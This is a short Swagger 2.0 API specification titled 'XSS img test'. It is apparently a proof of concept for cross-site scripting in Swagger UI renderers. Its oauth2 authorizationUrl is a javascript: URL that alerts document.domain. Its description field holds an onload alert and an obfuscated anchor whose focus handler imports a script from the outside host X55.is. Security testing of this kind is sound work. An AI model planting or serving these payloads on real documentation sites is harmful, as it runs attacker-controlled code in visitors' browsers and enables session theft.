swagger: '2.0'
securityDefinitions:
  a:
    type: oauth2
    authorizationUrl: javascript:alert(document.domain)//
info:
  version: "1.0.0"
  title: XSS img test
  description: onload="alert(1)" <A HRef=//X55.is AutoFocus %26%2362 OnFocus%0C=import(href)>
paths:
  /:
    get:
      responses:
        200:
          description: Successful response
